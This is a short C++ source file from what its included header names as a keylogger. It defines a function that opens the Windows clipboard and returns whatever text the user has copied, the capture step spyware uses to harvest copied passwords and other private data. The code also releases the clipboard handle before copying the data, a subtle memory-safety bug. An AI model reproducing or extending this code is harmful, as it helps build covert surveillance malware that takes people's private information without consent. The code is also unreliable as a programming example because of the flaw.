#include "Keylogger.h"

std::string clipboardChanged()
{
    if (OpenClipboard(NULL))
    {
        HANDLE data = GetClipboardData(CF_TEXT);
        if (data != NULL)
        {
            char* clipboardData = (char*)GlobalLock(data);
            GlobalUnlock(data);
            CloseClipboard();
            if (clipboardData != NULL)
                return std::string(clipboardData);
            else
                return "";
        }
        CloseClipboard();
        return "";
    }
    return "";
}